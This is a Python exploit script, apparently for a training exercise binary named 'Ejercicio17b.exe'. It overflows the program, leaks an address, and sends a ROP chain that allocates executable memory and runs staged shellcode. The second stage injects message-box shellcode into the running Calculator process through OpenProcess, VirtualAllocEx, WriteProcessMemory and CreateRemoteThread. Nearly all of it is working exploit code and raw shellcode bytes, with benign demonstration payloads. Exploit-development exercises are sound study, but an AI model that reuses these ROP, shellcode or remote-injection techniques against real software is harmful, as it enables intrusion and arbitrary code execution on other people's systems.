from struct import pack, unpack
from subprocess import Popen, PIPE
from nutshell import *

p32 = lambda x: pack("<L", x)
u32 = lambda x: unpack("<L", x)[0]

def readUntil(p, until):
	string = ""
	while True:
		string += p.stdout.read(1)
		if until in string:
			break
	return string
		
args = "A"*201
inp = "d4 1" + "\n"

p = Popen(["Ejercicio17b.exe", args], stdin=PIPE, stdout=PIPE)

print "ATTACH"
raw_input()

readUntil(p, ": ")
p.stdin.write(inp)
readUntil(p, ": ")
readUntil(p, "Address 3 ")
eip = int(p.stdout.read(6), 16)

print "eip: 0x%08x" % eip
readUntil(p, "\n")

user        = "user32.dll".ljust(12, '\0')
FWindow     = "FindWindowA".ljust(12, '\0')
GetPid      = "GetWindowThreadProcessId".ljust(28, '\0')
Open        = "OpenProcess".ljust(12, '\0')
VallocEx    = "VirtualAllocEx".ljust(16, '\0')
Write       = "WriteProcessMemory".ljust(20, '\0')
Create      = "CreateRemoteThread".ljust(20, '\0')
ExitProcess = "ExitProcess\0"

egg = Nutshell("x86", 0)

execalc  = "\x90\x90\x90\x90\x90\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"
execalc += "\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"
execalc += "\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"
execalc += "\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"
execalc += "\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\x90"

sc_msgbox  = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
sc_msgbox += "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
sc_msgbox += "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
sc_msgbox += "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
sc_msgbox += "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
sc_msgbox += "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
sc_msgbox += "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
sc_msgbox += "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
sc_msgbox += "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
sc_msgbox += "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
sc_msgbox += "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
sc_msgbox += "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
sc_msgbox += "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
sc_msgbox += "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
sc_msgbox += "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
sc_msgbox += "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
sc_msgbox += "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
sc_msgbox += "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
sc_msgbox += "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
sc_msgbox += "\x2C\x57\x68\x43\x4C\x53\x21\x8B\xDC\x57"
sc_msgbox += "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
sc_msgbox += "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
sc_msgbox += "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
sc_msgbox += "\x40\xFF\x54\x24\x40\x57\xFF\xD0"

stage2  = egg.nut_asm("mov ebp, esp")
stage2 += egg.nut_asm("add ebp, 0x600")
stage2 += egg.nut_asm("mov [ebp + 48], esi")
stage2 += execalc

stage2 += egg.nut_revolve("esi", "ebx") # esi = GetProcAddress, ebx = GetModuleHandle

stage2 += egg.nut_asm("push 0x%s" % user[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % user[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % user[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("call ebx")
stage2 += egg.nut_asm("mov edi, eax") # edi = module handle user32.dll
stage2 += egg.nut_asm("add esp, 0xC")

stage2 += egg.nut_asm("push 0x%s" % FWindow[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % FWindow[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % FWindow[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi") #GetProcAddress(user32.dll,FindWindow)
stage2 += egg.nut_asm("mov [ebp + 4], eax") #FindWindow

stage2 += egg.nut_asm("push 0x%s" % GetPid[24:28][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % GetPid[20:24][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % GetPid[16:20][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % GetPid[12:16][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % GetPid[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % GetPid[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % GetPid[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 8], eax") #GetWindowThreadProcessId

stage2 += egg.nut_asm("push 0x403a80")
stage2 += egg.nut_asm("call [0x100121e0]") # LoadLibrary("KERNEL32.DLL")
stage2 += egg.nut_asm("mov edi, eax") # edi = kernel32.dll Base
stage2 += egg.nut_asm("push 0x%s" % ExitProcess[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % ExitProcess[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % ExitProcess[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 12], eax") #ExitProcess

stage2 += egg.nut_asm("push 0x%s" % VallocEx[12:16][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % VallocEx[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % VallocEx[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % VallocEx[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 16], eax") #VirtualAlloEx

stage2 += egg.nut_asm("push 0x%s" % Open[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % Open[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Open[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 20], eax") #OpenProcess

stage2 += egg.nut_asm("push 0x%s" % Write[16:20][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Write[12:16][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Write[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % Write[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Write[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 24], eax") #WriteProcess
       
stage2 += egg.nut_asm("push 0x%s" % Create[16:20][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Create[12:16][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Create[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % Create[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % Create[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call esi")
stage2 += egg.nut_asm("mov [ebp + 28], eax") #CreateRemoteProcess

calc = "Calculadora\0"
stage2 += egg.nut_asm("push 0x%s" % calc[8:12][::-1].encode("hex")) 
stage2 += egg.nut_asm("push 0x%s" % calc[4:8][::-1].encode("hex"))
stage2 += egg.nut_asm("push 0x%s" % calc[:4][::-1].encode("hex"))
stage2 += egg.nut_asm("mov [ebp + 32], esp")
stage2 += egg.nut_asm("mov eax, [ebp + 4]")
stage2 += egg.nut_asm("xor edi, edi")
stage2 += egg.nut_asm("push [ebp + 32]")
stage2 += egg.nut_asm("push edi")
stage2 += egg.nut_asm("call eax") # FindWindow(NULL, "Calculadora")

stage2 += egg.nut_asm("mov [ebp + 36], eax")
stage2 += egg.nut_asm("mov eax, [ebp + 8]")
stage2 += egg.nut_asm("push esp")
stage2 += egg.nut_asm("push [ebp + 36]")
stage2 += egg.nut_asm("call eax") # GetWindowThreadProcessId([ebp + 28], esp)

stage2 += egg.nut_asm("mov eax, [esp]")
stage2 += egg.nut_asm("mov ebx, [ebp + 20]")
stage2 += egg.nut_asm("push eax")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push 0x1f0fff")
stage2 += egg.nut_asm("call ebx") # OpenProcess(process_all, False, pid)

stage2 += egg.nut_asm("mov [ebp + 40], eax") # handle
stage2 += egg.nut_asm("mov ebx, [ebp+16]")
stage2 += egg.nut_asm("push 0x40")
stage2 += egg.nut_asm("push 0x1000")
stage2 += egg.nut_asm("push %s" % hex(len(sc_msgbox)))
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push [ebp + 40]")
stage2 += egg.nut_asm("call ebx") # VirtuallAllocEx(handle, 0, len(winexec), 0x1000, 0x40)

stage2 += egg.nut_asm("mov [ebp + 44], eax") # remote_mem
stage2 += egg.nut_asm("mov ebx, [ebp + 24]")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push %s" % hex(len(sc_msgbox)))
stage2 += egg.nut_asm("mov esi, [ebp + 48]")
stage2 += egg.nut_asm("add esi, 0x2a0")
stage2 += egg.nut_asm("push esi")
stage2 += egg.nut_asm("push eax")
stage2 += egg.nut_asm("push [ebp + 40]")
stage2 += egg.nut_asm("call ebx")

stage2 += egg.nut_asm("mov ebx, [ebp + 28]")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push [ebp + 44]")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("push [ebp + 40]")
stage2 += egg.nut_asm("call ebx")

stage2 += egg.nut_asm("mov eax, [ebp + 12]")
stage2 += egg.nut_asm("push 0x0")
stage2 += egg.nut_asm("call eax")
stage2 += "\x90"*0x20
stage2 += sc_msgbox

va = "VirtualAlloc".ljust(16, '\0')
ms = "msvcrt.dll".ljust(12, '\0')
gs = "_read".ljust(8, '\0')

stage1  = egg.nut_asm("push 0x800")
stage1 += egg.nut_asm("call [0x40305c]")     # malloc(0x800)
stage1 += egg.nut_asm("mov esi, eax")
stage1 += egg.nut_asm("push 0x%s" % ms[8:12][::-1].encode("hex")) 
stage1 += egg.nut_asm("push 0x%s" % ms[4:8][::-1].encode("hex"))
stage1 += egg.nut_asm("push 0x%s" % ms[:4][::-1].encode("hex"))
stage1 += egg.nut_asm("push esp")
stage1 += egg.nut_asm("call [0x100121e0]")   # LoadLibrary("msvcrt.dll)"
stage1 += egg.nut_asm("push 0x%s" % gs[4:8][::-1].encode("hex"))
stage1 += egg.nut_asm("push 0x%s" % gs[:4][::-1].encode("hex"))
stage1 += egg.nut_asm("push esp")
stage1 += egg.nut_asm("push eax")
stage1 += egg.nut_asm("call [0x100121ec]")   # GetProcAddress(mscv_base, "_read")
stage1 += egg.nut_asm("push 0x800")
stage1 += egg.nut_asm("push esi")
stage1 += egg.nut_asm("push 0x0")
stage1 += egg.nut_asm("call eax")            # _read(0, malloc_chunk, 0x800)
stage1 += egg.nut_asm("jmp esi")
stage1 += "\n"

p.stdin.write(p32(eip + 4)		# ptr stack pivot
			+ p32(0x00401358)	# xchg eax, esp ; ... ; ret
			+ p32(0x0040188E)	# pop esi ; ret 
			+ p32(0x100121e0)	# kernel32.LoadLibrary (iat pthreadVC2.dll)
			+ p32(0x00401D4B)	# mov edi, [esi] ; ... ; call edi ; ... ; ret
			+ p32(0x100114b4)	# offset "kernel32.dll"
			+ "A"*4				# junk
			+ p32(0x100121ec)	# kernel32.GetProcAddress (iat pthreadVC2.dll)
			+ p32(0x01010101)	# check jb bypass
			+ p32(0x10002096)	# pop ecx ; ret 
			+ p32(eip + 0x34)	# ptr ecx
			+ p32(0x10004298)	# mov [ecx], eax ; xor eax, eax ; ret	 
			+ p32(0x00401D4B)	# mov edi, [esi] ; ... ; call edi ; ... ; ret
			+ "A"*4				# match by [ecx]
			+ p32(eip + 0x3c)	# ptr string VirtualAlloc
			+ "VirtualAlloc"	# string VirtualAlloc	
			+ p32(0x10006300)	# ret 
			+ p32(0x10002096)	# pop ecx ; ret 
			+ p32(eip + 0x58)	# ptr ecx 
			+ p32(0x10004298)	# mov [ecx], eax ; xor eax, eax ; ret 
			+ "A"*4				# match by [ecx]
			+ p32(eip + 0x70)	# ret to shellcode 
			+ p32(eip + 0x70)	# ptr rwx
			+ p32(0x1000)		# size 
			+ p32(0x1000)		# memcommit 
			+ p32(0x40)			# rwx 
			+ stage1			# shellcode 
			+ "\n")
			
p.stdin.write(stage2 + "\n")
